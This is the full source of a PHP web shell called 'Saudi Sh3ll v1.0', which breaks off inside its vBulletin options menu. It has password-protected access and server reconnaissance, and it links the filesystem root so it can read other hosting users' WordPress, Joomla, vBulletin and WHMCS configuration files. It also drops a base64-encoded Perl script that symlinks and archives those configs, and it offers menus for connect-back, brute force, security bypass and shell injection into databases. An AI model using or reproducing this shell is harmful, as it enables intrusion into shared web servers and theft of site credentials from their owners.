<?
ob_start();
?>

<?php
########################################\
#                                        #
#            Saudi Sh3ll v1.0            #
#                                        #
#             by al-swisre               #
#                                        #
########################################/


$auth = 1;
$name='4ced0e3abe1ac578c40152b1a2cf6583'; // Saudi
$pass='4ced0e3abe1ac578c40152b1a2cf6583'; // Saudi
if($auth == 1) {
if (!isset($_SERVER['PHP_AUTH_USER']) || md5($_SERVER['PHP_AUTH_USER'])!==$name || md5($_SERVER['PHP_AUTH_PW'])!==$pass)
   {
   header('WWW-Authenticate: Basic realm="Saudi Sh3ll v1.0"');
   header('HTTP/1.0 401 Unauthorized');
   exit("<b></b>");
   }
}
?>


<?






@set_time_limit(0);
@error_reporting(0);


if ($_GET['sws']== 'phpinfo')
{

echo @phpinfo();

exit;

}



echo '


<title>'.$_SERVER['HTTP_HOST'].' ~ Saudi Sh3ll</title>
<meta http-equiv="content=type"  content="text/html; charset=utf-8" />





<style type="text/css">
  html,body {
     margin-top: 5px ;
     padding: 0;
     outline: 0;
}


body {

    direction: ltr;
    background-color: #000000;
    color: #CCCCCC;
    font-family: Tahoma, Arial, sans-serif;
    font-weight: bold;
    text-align: center ;
}

input,textarea,select{
font-weight: bold;
color: #FFFFFF;
dashed #ffffff;
border: 1px dotted #003300;
background-color: black;
padding: 3px
}

input:hover{
box-shadow:0px 0px 4px #009900;

}
.cont a

{


text-decoration: none;
color: #FFFFFF;



}
.hedr
{
font-size:32px;
color: #009900;
text-shadow: 0px 0px 4px #003300 ;



}



.td1{


    border: 1px dotted #022B04;
    padding: 8px;
    border-radius: 20px;
    text-shadow: 0px 0px 2px #003300;
    font-size: 10px;
    font-family: Tahoma;
    font-weight: bold;

}

.td1 tr{}

.lol{
  text-align: left;
  float: left;
  background: #990000;
}
.nop{

width: 180px;
text-align: center;
font-size: 15px;
font-family:Tahoma;
color: #003300;



}
.nop a{
  text-decoration: none;
  color: #003300 ;
  text-shadow: none;
  width: 80px;
  padding: 8px


}
.nop a:hover{
  color: #FFFFFF;
 box-shadow: 0px 0px 4px #006600 ;



  }
a
{
text-decoration: none;
color: #006600;

}


.tmp tr td:hover{

box-shadow: 0px 0px 4px #EEEEEE;

}
.fot{

font-family:Tahoma, Arial, sans-serif;

  font-size: 13pt;
}

.ir {
  color: #FF0000;
}

.cont
{
float:right;
color: #FFFFFF;
box-shadow: 0px 0px 4px #003300;
font-size: 13px;
padding: 8px

}

.cont a{

 text-decoration: none;
 color: #FFFFFF;
 font-family: Tahoma, Arial, sans-serif  ;
 font-size: 13px;
 text-shadow: 0px 0px 3px ;
}

.cont a:hover{


  color: #FF0000 ;
  text-shadow:0px 0px 3px #FF0000 ;


}

.cont3
{
color: #FFFFFF;
font-size: 15px;
padding: 8px

}

.cont3 a{

 text-decoration: none;
 color: #FFFFFF;
 font-family: Tahoma, Arial, sans-serif  ;
 font-size: 15px;
 text-shadow: 0px 0px 3px ;
}

.cont3 a:hover{


  color: #FF0000 ;
  text-shadow:0px 0px 3px #FF0000 ;


}

.tmp tr td{

border: dotted 1px #003300;

padding: 4px ;
font-size: 14px;
}

.tmp tr td a {
  text-decoration: none;

}
.cmd
{

float:right;

}
 .tbm{
 font-size: 14px;
}

.tbm tr td{
 border: dashed 1px #111111;

}
.hr{

border: dotted 1px #003300;
padding: 5px ;
font-size: 13px;
color: white ;
text-shadow: 0px 0px 3px ;
}

.hr2{

border: dotted 1px #003300;
padding: 5px ;
font-size: 13px;
color: red ;
text-shadow: 0px 0px 3px ;
}

.t3p{
width: 100%;

}

.t3p{margin-left: 45px ;}

.t33p{margin-left: 45px ;}


.t3p tr td{

border:  solid 1px #002F00;
padding: 2px ;
font-size: 13px;
text-align: center ;
font-weight: bold;
margin-left: 20px ;

}
.t3p tr td:hover{

box-shadow: 0px 0px 4px #009900;

}


.info {margin-left: 100px ; }

.info tr td
{

border:  solid 1px #002F00;
padding: 5px ;
font-size: 13px;
text-align: center ;
font-weight: bold;


}
.conn{width: 70%;}

.conn tr td{
border: 1px dashed #003300;
padding: 5px ;
font-size: 13px;
text-align: center ;
font-weight: bold;

}


.lol a{

font-size: 10px;

}

.d0n{
width: 90%;
border-top:  solid 1px #003300;

}
.d0n tr td{
font-weight: bold;
color: #FFFFFF;
 font-family: Tahoma, Arial, sans-serif  ;
 font-size: 13px;
 margin-left: 110px ;


}
.site
{

font-weight: bold;
width: 50%;
box-shadow: 0px 0px 2px #003300;


}

.ab
{
box-shadow: 0px 0px 6px #444444;
width: 70%;
padding: 10px ;

}

.ab tr td
{
text-align: center ;
font-weight: bold;
 font-family: Tahoma, Arial, sans-serif  ;
  font-size: 13px;
 color: white;
  text-shadow: 0px 0px 2px white ;


}
.ab tr td b
{
color:red ;
text-shadow: 0px 0px 2px red ;
}
.ab tr td a
{
 color: white;
  text-shadow: 0px 0px 2px white ;

}
.ab tr td a:hover
{
color:#006600 ;
text-shadow: none ;
}

.bru
{
color: #FFFFFF;
font-family: Tahoma, Arial, sans-serif  ;
font-size: 14px;
text-shadow: 0px 0px 3px #000000 ;

}

.foter
{

color: #003300;
 font-family: Tahoma, Arial, sans-serif  ;
 font-size: 11px;
 text-shadow: 0px 0px 3px #000000 ;


}







</style>

';

echo '

<table width="95%" cellspacing="0" cellpadding="0" class="tb1" >

			<td width="15%" valign="top" rowspan="2">
            <div class="hedr"> <img src="http://im11.gulfup.com/2012-02-03/1328267135241.png" align="left" alt="Saudi Shell" > </div>
             </td>

        <td height="100" align="left" class="td1"   >

';

$pg = basename(__FILE__);

echo "OS : <b><font color=green>";
$safe_mode = @ini_get('safe_mode');
$dir = @getcwd();
$ip=$_SERVER['REMOTE_ADDR'];
$ips=$_SERVER['SERVER_ADDR'];
define('SWS','al-swisre');

if ($os)
{


}
else
{
  $os = @php_uname();
  echo $os ;
}
echo "&nbsp;&nbsp;&nbsp;[ <a style='text-decoration: none; color: #003300; text-shadow: 2px 2px 7px #003300;   ' target='_blank' href='http://www.google.com.sa/search?hl=ar&safe=active&client=firefox-a&hs=9Xx&rls=org.mozilla%3Aar%3Aofficial&q=$os&oq=$os&aq=f&aqi=&aql=&gs_sm=e&gs_upl=5759106l5781953l0l5782411l1l1l0l0l0l0l0l0ll0l0'>Google</a> ]";
echo "&nbsp;&nbsp;&nbsp;[ <a style='text-decoration: none; color: #003300; text-shadow: 2px 2px 7px #003300;   ' target='_blank' href='http://www.exploit-db.com/search/?action=search&filter_page=1&filter_description=$os&filter_exploit_text=&filter_author=&filter_platform=0&filter_type=0&filter_lang_id=0&filter_port=&filter_osvdb=&filter_cve='>exploit-db</a> ]";
echo "</font><br /></b>";

echo (($safe_mode)?("safe_mode &nbsp;: <b><font color=red>ON</font></b>"):("safe_mode: <b><font color=green>OFF</font></b>"));
echo "<br />disable_functions : ";
if(''==($df=@ini_get('disable_functions'))){echo "<font color=green>NONE</font></b>";}else{


echo "<font color=red>$df</font></b>";

}

echo "<br />Server :&nbsp;<font color=green>".$_SERVER['SERVER_SOFTWARE']."</font><br>";

echo "PHP version : <b><font color=green>".@phpversion()."</font></b><br />";


echo "Id : <font color=green><b>"."user = ".@get_current_user()." | uid= ".@getmyuid()." | gid= ".@getmygid()."</font></b><br />";

echo "Pwd : <font color=green><b>".$dir."&nbsp;&nbsp;".wsoPermsColor($dir)."</font></b>&nbsp;&nbsp;[ <a href='$pg'>Home</a> ]<br /><br /><br />";


echo "Your ip :&nbsp;<font ><b><a style='text-decoration: none; color: #FF0000;' href='http://whatismyipaddress.com/ip/$ip' target='_blank' >$ip &nbsp;&nbsp;</a></font></b>

 | ip server :&nbsp;<a style='text-decoration: none; color: #FF0000;' href='http://whatismyipaddress.com/ip/$ips' target='_blank' >$ips</a></font></b>

| &nbsp;<a style='text-decoration: none; color: #FF0000;' href='$pg?sws=site' target='_blank' >list site</a></font></b>
| &nbsp;<a style='text-decoration: none; color: #FF0000;' href='?sws=phpinfo' target='_blank' >phpinfo</a></font></b> |";









 echo "
<br />








        </tr>
        </table>

<table cellspacing='0' cellpadding='0'  style=' margin:9px'>

    <tr>
			<td  rowspan='2' class='td1' valign='top' >


        <div class='nop'>

         <br /><a href='$pg' >File Manager</a> <br /> <br />
         <a href='$pg?sws=info' >More info</a> <br /><br />
         <a href='$pg?sws=ms' >Mysql Manager</a> <br /><br />
         <a href='$pg?sws=byp' >bypass Security</a> <br /><br />
         <a href='$pg?sws=sm' >Symlink</a> <br /><br />
         <a href='$pg?sws=con' >Connect Back</a> <br /><br />
         <a href='?sws=brt' >BruteForce</a> <br /><br />
         <a href='$pg?sws=ab' >About Por</a> <br />



        </div>

    ";





echo '

<td  height="444" width="82%"  align="center" valign="top">

';


if(isset($_REQUEST['sws']))
{

switch ($_REQUEST['sws'])
{


////////////////////////////////////////////////// Symlink //////////////////////////////////////

case 'sm':

$sws = 'al-swisre' ;

$mk = @mkdir('sym',0777);



$htcs  = "Options all \n DirectoryIndex Sux.html \n AddType text/plain .php \n AddHandler server-parsed .php \n  AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";
$f =@fopen ('sym/.htaccess','w');


@fwrite($f , $htcs);


$sym = @symlink("/","sym/root");




$pg = basename(__FILE__);



echo '<div class="cont3">
[ <a href="?sws=sm"> Symlink File </a>]

[<a href="?sws=sm&sy=sym"> User & Domains & Symlink </a>]

[<a href="?sws=sm&sy=sec"> Domains & Script </a>]

[ <a href="?sws=sm&sy=pl">Make Symlink Perl</a>]
</div><br /><br />'  ;

////////////////////////////////// file ////////////////////////
$sws = 'al-swisre' ;

if(isset($_REQUEST['sy']))
{

switch ($_REQUEST['sy'])
{





/// Domains + Scripts  ///

case 'sec':


$d00m = @file("/etc/named.conf");

if(!$d00m)
{
die (" can't read /etc/named.conf");
}
else

{
echo "<div class='tmp'>
<table align='center' width='40%'><td> Domains </td><td> Script </td>";
foreach($d00m as $dom){

if(eregi("zone",$dom)){

preg_match_all('#zone "(.*)"#', $dom, $domsws);

flush();

if(strlen(trim($domsws[1][0])) > 2){

$user = posix_getpwuid(@fileowner("/etc/valiases/".$domsws[1][0]));

///////////////////////////////////////////////////////////////////////////////////

$wpl=$pageURL."/sym/root/home/".$user['name']."/public_html/wp-config.php";
$wpp=@get_headers($wpl);
$wp=$wpp[0];

$wp2=$pageURL."/sym/root/home/".$user['name']."/public_html/blog/wp-config.php";
$wpp2=@get_headers($wp2);
$wp12=$wpp2[0];

///////////////////////////////

$jo1=$pageURL."/sym/root/home/".$user['name']."/public_html/configuration.php";
$joo=@get_headers($jo1);
$jo=$joo[0];


$jo2=$pageURL."/sym/root/home/".$user['name']."/public_html/joomla/configuration.php";
$joo2=@get_headers($jo2);
$jo12=$joo2[0];

////////////////////////////////

$vb1=$pageURL."/sym/root/home/".$user['name']."/public_html/includes/config.php";
$vbb=@get_headers($vb1);
$vb=$vbb[0];

$vb2=$pageURL."/sym/root/home/".$user['name']."/public_html/vb/includes/config.php";
$vbb2=@get_headers($vb2);
$vb12=$vbb2[0];

$vb3=$pageURL."/sym/root/home/".$user['name']."/public_html/forum/includes/config.php";
$vbb3=@get_headers($vb3);
$vb13=$vbb3[0];

/////////////////

$wh1=$pageURL."/sym/root/home/".$user['name']."public_html/clients/configuration.php";
$whh2=@get_headers($wh1);
$wh=$whh2[0];

$wh2=$pageURL."/sym/root/home/".$user['name']."/public_html/support/configuration.php";
$whh2=@get_headers($wh2);
$wh12=$whh2[0];

$wh3=$pageURL."/sym/root/home/".$user['name']."/public_html/client/configuration.php";
$whh3=@get_headers($wh3);
$wh13=$whh3[0];

$wh5=$pageURL."/sym/root/home/".$user['name']."/public_html/submitticket.php";
$whh5=@get_headers($wh5);
$wh15=$whh5[0];

$wh4=$pageURL."/sym/root/home/".$user['name']."/public_html/client/configuration.php";
$whh4=@get_headers($wh4);
$wh14=$whh4[0];



////////////////////////////////////////////////////////////////////////////////

 ////////// Wordpress ////////////

$pos = strpos($wp, "200");
$config="&nbsp;";

if (strpos($wp, "200") == true )
{
 $config="<a href='".$wpl."' target='_blank'>Wordpress</a>";
}
elseif (strpos($wp12, "200") == true)
{
  $config="<a href='".$wp2."' target='_blank'>Wordpress</a>";
}

///////////WHMCS////////

elseif (strpos($jo, "200")  == true and strpos($wh15, "200")  == true )
{
  $config=" <a href='".$wh5."' target='_blank'>WHMCS</a>";

}
elseif (strpos($wh12, "200")  == true)
{
  $config =" <a href='".$wh2."' target='_blank'>WHMCS</a>";
}

elseif (strpos($wh13, "200")  == true)
{
  $config =" <a href='".$wh3."' target='_blank'>WHMCS</a>";

}

///////// Joomla to 4 ///////////

elseif (strpos($jo, "200")  == true)
{
  $config=" <a href='".$jo1."' target='_blank'>Joomla</a>";
}

elseif (strpos($jo12, "200")  == true)
{
  $config=" <a href='".$jo2."' target='_blank'>Joomla</a>";
}

//////////vBulletin to 4 ///////////

elseif (strpos($vb, "200")  == true)
{
  $config=" <a href='".$vb1."' target='_blank'>vBulletin</a>";
}

elseif (strpos($vb12, "200")  == true)
{
  $config=" <a href='".$vb2."' target='_blank'>vBulletin</a>";
}

elseif (strpos($vb13, "200")  == true)
{
  $config=" <a href='".$vb3."' target='_blank'>vBulletin</a>";
}

else
{
 continue;
}

/////////////////////////////////////////////////////////////////////////////////////



$site = $user['name'] ;




echo "<tr><td><a href=http://www.".$domsws[1][0]."/>".$domsws[1][0]."</a></td>
<td>".$config."</td></tr>"; flush();
exit;

}
}
}
}




break;


/// user + domine + symlink  ///

case 'sym':

$d00m = @file("/etc/named.conf");

if(!$d00m)
{
die (" can't read /etc/named.conf");
}
else

{
echo "<div class='tmp'><table align='center' width='40%'><td>Domains</td><td>Users</td><td>symlink </td>";
foreach($d00m as $dom){

if(eregi("zone",$dom)){

preg_match_all('#zone "(.*)"#', $dom, $domsws);

flush();

if(strlen(trim($domsws[1][0])) > 2){

$user = posix_getpwuid(@fileowner("/etc/valiases/".$domsws[1][0]));



$site = $user['name'] ;


@symlink("/","sym/root");

$site = $domsws[1][0];

$ir = 'ir';

$il = 'il';

if (preg_match("/.^$ir/",$domsws[1][0]) or preg_match("/.^$il/",$domsws[1][0]) )
{
$site = "<div style=' color: #FF0000 ; text-shadow: 0px 0px 1px red; '>".$domsws[1][0]."</div>";
}


echo "
<tr>

<td>
<div class='dom'><a target='_blank' href=http://www.".$domsws[1][0]."/>".$site." </a> </div>
</td>


<td>
".$user['name']."
</td>






<td>
<a href='sym/root/home/".$user['name']."/public_html' target='_blank'>symlink </a>
</td>


</tr></div> ";


flush();

}
}
}
}




break;

case 'pl':

if (!is_dir('sa2')){

$mk = @mkdir('sa2',0777);



if (is_file('sa2/perl.pl'))
{


echo "<a href='sa2/perl.pl' target='_blank'>Symlink Perl</a>";


@chmod('sa2/perl.pl',0755);




}
else
{




$f2 =@fopen ('sa2/perl.pl','w');


$sml_perl = "IyEvdXNyL2Jpbi9wZXJsIC1JL2hvbWUvYWxqbm9mcWUvcHVibGljX2h0bWwvdHJhZmlxL2dvbmZpZy5wbA0KcHJpbnQgIkNvbnRlbnQtdHlwZTogdGV4dC9odG1sXG5cbiI7DQpwcmludCc8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIFhIVE1MIDEuMCBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIveGh0bWwxL0RURC94aHRtbDEtdHJhbnNpdGlvbmFsLmR0ZCI+DQo8aHRtbCB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94aHRtbCI+DQo8aGVhZD4NCjxtZXRhIGh0dHAtZXF1aXY9IkNvbnRlbnQtTGFuZ3VhZ2UiIGNvbnRlbnQ9ImVuLXVzIiAvPg0KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9dXRmLTgiIC8+DQo8dGl0bGU+W35dIFBhaW4gU3ltbGluazwvdGl0bGU+DQo8c3R5bGUgdHlwZT0idGV4dC9jc3MiPg0KLm5ld1N0eWxlMSB7DQogZm9udC1mYW1pbHk6IFRhaG9tYTsNCiBmb250LXNpemU6IHgtc21hbGw7DQogZm9udC13ZWlnaHQ6IGJvbGQ7DQogY29sb3I6ICMwMEZGRkY7DQogIHRleHQtYWxpZ246IGNlbnRlcjsNCn0NCjwvc3R5bGU+DQo8L2hlYWQ+DQonOw0Kc3ViIGxpbHsNCiAgICAoJHVzZXIpID0gQF87DQokbXNyID0gcXh7cHdkfTsNCiRrb2xhPSRtc3IuIi8iLiR1c2VyOw0KJGtvbGE9fnMvXG4vL2c7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvdmIvaW5jbHVkZXMvY29uZmlnLnBocCcsJGtvbGEuJ35+dkJ1bGxldGluMS50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9pbmNsdWRlcy9jb25maWcucGhwJywka29sYS4nfn52QnVsbGV0aW4yLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2ZvcnVtL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRrb2xhLid+fnZCdWxsZXRpbjMudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvY2MvaW5jbHVkZXMvY29uZmlnLnBocCcsJGtvbGEuJ35+dkJ1bGxldGluNC50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25maWcucGhwJywka29sYS4nfn5QaHBiYjEudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvZm9ydW0vaW5jbHVkZXMvY29uZmlnLnBocCcsJGtvbGEuJ35+UGhwYmIyLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3dwLWNvbmZpZy5waHAnLCRrb2xhLid+fldvcmRwcmVzczEudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvYmxvZy93cC1jb25maWcucGhwJywka29sYS4nfn5Xb3JkcHJlc3MyLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nfn5Kb29tbGExLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2Jsb2cvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLid+fkpvb21sYTIudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvam9vbWxhL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nfn5Kb29tbGEzLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3dobS9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJ35+V2htMS50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93aG1jL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nfn5XaG0yLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3N1cHBvcnQvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLid+fldobTMudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvY2xpZW50L2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nfn5XaG00LnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2JpbGxpbmdzL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nfn5XaG01LnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2JpbGxpbmcvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLid+fldobTYudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvY2xpZW50cy9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJ35+V2htNy50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93aG1jcy9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJ35+V2htOC50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9vcmRlci9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJ35+V2htOS50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9hZG1pbi9jb25mLnBocCcsJGtvbGEuJ35+NS50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9hZG1pbi9jb25maWcucGhwJywka29sYS4nfn40LnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2NvbmZfZ2xvYmFsLnBocCcsJGtvbGEuJ35+aW52aXNpby50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9pbmNsdWRlL2RiLnBocCcsJGtvbGEuJ35+Ny50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25uZWN0LnBocCcsJGtvbGEuJ35+OC50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ta19jb25mLnBocCcsJGtvbGEuJ35+bWstcG9ydGFsZTEudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvaW5jbHVkZS9jb25maWcucGhwJywka29sYS4nfn4xMi50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zZXR0aW5ncy5waHAnLCRrb2xhLid+flNtZi50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9pbmNsdWRlcy9mdW5jdGlvbnMucGhwJywka29sYS4nfn5waHBiYjMudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvaW5jbHVkZS9kYi5waHAnLCRrb2xhLid+fmluZmluaXR5LnR4dCcpOw0KfQ0KaWYgKCRFTlZ7J1JFUVVFU1RfTUVUSE9EJ30gZXEgJ1BPU1QnKSB7DQogIHJlYWQoU1RESU4sICRidWZmZXIsICRFTlZ7J0NPTlRFTlRfTEVOR1RIJ30pOw0KfSBlbHNlIHsNCiAgJGJ1ZmZlciA9ICRFTlZ7J1FVRVJZX1NUUklORyd9Ow0KfQ0KQHBhaXJzID0gc3BsaXQoLyYvLCAkYnVmZmVyKTsNCmZvcmVhY2ggJHBhaXIgKEBwYWlycykgew0KICAoJG5hbWUsICR2YWx1ZSkgPSBzcGxpdCgvPS8sICRwYWlyKTsNCiAgJG5hbWUgPX4gdHIvKy8gLzsNCiAgJG5hbWUgPX4gcy8lKFthLWZBLUYwLTldW2EtZkEtRjAtOV0pL3BhY2soIkMiLCBoZXgoJDEpKS9lZzsNCiAgJHZhbHVlID1+IHRyLysvIC87DQogICR2YWx1ZSA9fiBzLyUoW2EtZkEtRjAtOV1bYS1mQS1GMC05XSkvcGFjaygiQyIsIGhleCgkMSkpL2VnOw0KICAkRk9STXskbmFtZX0gPSAkdmFsdWU7DQp9DQppZiAoJEZPUk17cGFzc30gZXEgIiIpew0KcHJpbnQgJw0KPGJvZHkgY2xhc3M9Im5ld1N0eWxlMSIgYmdjb2xvcj0iIzAwMDAwMCI+DQogPGJyIC8+PGJyIC8+DQo8Zm9ybSBtZXRob2Q9InBvc3QiPg0KPHRleHRhcmVhIG5hbWU9InBhc3MiIHN0eWxlPSJib3JkZXI6MnB4IGRvdHRlZCAjMDAzMzAwOyB3aWR0aDogNTQzcHg7IGhlaWdodDogNDIwcHg7IGJhY2tncm91bmQtY29sb3I6IzBDMEMwQzsgZm9udC1mYW1pbHk6VGFob21hOyBmb250LXNpemU6OHB0OyBjb2xvcjojRkZGRkZGIiAgPjwvdGV4dGFyZWE+PGJyIC8+DQombmJzcDs8cD4NCjxpbnB1dCBuYW1lPSJ0YXIiIHR5cGU9InRleHQiIHN0eWxlPSJib3JkZXI6MXB4IGRvdHRlZCAjMDAzMzAwOyB3aWR0aDogMjEycHg7IGJhY2tncm91bmQtY29sb3I6IzBDMEMwQzsgZm9udC1mYW1pbHk6VGFob21hOyBmb250LXNpemU6OHB0OyBjb2xvcjojRkZGRkZGOyAiICAvPjxiciAvPg0KJm5ic3A7PC9wPg0KPHA+DQo8aW5wdXQgbmFtZT0iU3VibWl0MSIgdHlwZT0ic3VibWl0IiB2YWx1ZT0iR2V0IENvbmZpZyIgc3R5bGU9ImJvcmRlcjoxcHggZG90dGVkICMwMDMzMDA7IHdpZHRoOiA5OTsgZm9udC1mYW1pbHk6VGFob21hOyBmb250LXNpemU6MTBwdDsgY29sb3I6I0ZGRkZGRjsgdGV4dC10cmFuc2Zvcm06dXBwZXJjYXNlOyBoZWlnaHQ6MjM7IGJhY2tncm91bmQtY29sb3I6IzBDMEMwQyIgLz48L3A+DQo8L2Zvcm0+PGJyIC8+PGJyIC8+UmlnaHRzIG9mIHRoaXMgcGVybCB0byBLYXJhciBhTFNoYU1pJzsNCn1lbHNlew0KQGxpbmVzID08JEZPUk17cGFzc30+Ow0KJHkgPSBAbGluZXM7DQpvcGVuIChNWUZJTEUsICI+dGFyLnRtcCIpOw0KcHJpbnQgTVlGSUxFICJ0YXIgLWN6ZiAiLiRGT1JNe3Rhcn0uIi50YXIgIjsNCmZvciAoJGthPTA7JGthPCR5OyRrYSsrKXsNCndoaWxlKEBsaW5lc1ska2FdICA9fiBtLyguKj8pOng6L2cpew0KJmxpbCgkMSk7DQpwcmludCBNWUZJTEUgJDEuIi50eHQgIjsNCmZvcigka2Q9MTska2Q8MTg7JGtkKyspew0KcHJpbnQgTVlGSUxFICQxLiRrZC4iLnR4dCAiOw0KfQ0KfQ0KIH0NCnByaW50Jzxib2R5IGNsYXNzPSJuZXdTdHlsZTEiIGJnY29sb3I9IiMwMDAwMDAiPg0KPHA+RG9uZSAhITwvcD4NCjxwPiZuYnNwOzwvcD4nOw0KaWYoJEZPUk17dGFyfSBuZSAiIil7DQpvcGVuKElORk8sICJ0YXIudG1wIik7DQpAbGluZXMgPTxJTkZPPiA7DQpjbG9zZShJTkZPKTsNCnN5c3RlbShAbGluZXMpOw0KcHJpbnQnPHA+PGEgaHJlZj0iJy4kRk9STXt0YXJ9LicudGFyIj48Zm9udCBjb2xvcj0iIzAwRkYwMCI+DQo8c3BhbiBzdHlsZT0idGV4dC1kZWNvcmF0aW9uOiBub25lIj5DbGljayBIZXJlIFRvIERvd25sb2FkIFRhciBGaWxlPC9zcGFuPjwvZm9udD48L2E+PC9wPic7DQp9DQp9DQogcHJpbnQiDQo8L2JvZHk+DQo8L2h0bWw+Ijs=";

$write = fwrite ($f2 ,base64_decode($sml_perl));

if ($write)
{

@chmod('sa2/perl.pl',0755);


}

echo "<a href='sa2/perl.pl' target='_blank'>Symlink Perl</a>";
}


break;


}
/// home ///
}
}
else
{

echo '
The file path to symlink

<br /><br />
<form method="post">
<input type="text" name="file" value="/home/user/public_html/file.name" size="60"/><br /><br />
<input type="text" name="symfile" value="sa.txt" size="60"/><br /><br />
<input type="submit" value="symlink" name="symlink" /> <br /><br />



</form>
';


$pfile = $_POST['file'];
$symfile = $_POST['symfile'];
$symlink = $_POST['symlink'];

if ($symlink)
{

@symlink("$pfile","sym/$symfile");

echo '<br /><a target="_blank" href="sym/'.$symfile.'" >'.$symfile.'</a>';
exit;
}else {exit;}




}



break;



//////////////////////// mysql ///////////////////////////////////////////////////////////////////////////////


case 'ms':




$host = $_POST['host'];
$user = $_POST['user'];
$pass = $_POST['pass'];
$db = $_POST['db'];






////////////////// HEEEEEEEEEEEEERE  /////////////////////////////////////////////// HEEEEEEEEEEEEERE  /////////////////////////////

if ($_GET['show'] == 'tb'){

$host_c =  $_COOKIE['host_mysql'];
$user_c =  $_COOKIE['user_mysql'];
$pass_c =  $_COOKIE['pass_mysql'];
$db_c   =  $_COOKIE['db_mysql'];


$con = @mysql_connect($host_c,$user_c,$pass_c);
$sel = @mysql_select_db($db_c);


if(!$sel){ echo "mysql connect error" ; exit;}

$dbname = $db_c;

$pTable =  mysql_list_tables( $dbname ) ;

$num = mysql_num_rows( $pTable );

echo "<div class='tmp'>
<table align='center' width='40%'><td> Tables </td><td> Rows </td>";

for( $i = 0; $i < $num; $i++ ) {


    $tablename = mysql_tablename( $pTable, $i );

    $sq3l=mysql_query("select  * from $tablename");

    $c3t=mysql_num_rows($sq3l);

    echo "

    <tr>

<td>
<div class='dom'><a  href='$pg?sws=ms&show=cl&tb=$tablename'  />".$tablename." </a> </div>
</td>


<td>
".$c3t."
</td>

</tr>

    ";




if ($tablename == 'template')  { $secript = 'vb'; }

else if ($tablename == 'wp_post') {$secript = 'wp';}

else if ($tablename == 'jos_users') {$secript = 'jm';}

else if ($tablename == 'tbladmins') {$secript = 'wh';}


}


if ($secript == 'vb')

{


echo '<div class="cont">
<div style="text-shadow: 0px 0px 4px #FFFFFF"> <b>Options vBulletin </b>
<br />  <br /> <b>
[ <a href="?sws=ms&op=in"> Update Index </a>]

[<a href="?sws=ms&op=sh"> Inject shell</a>]

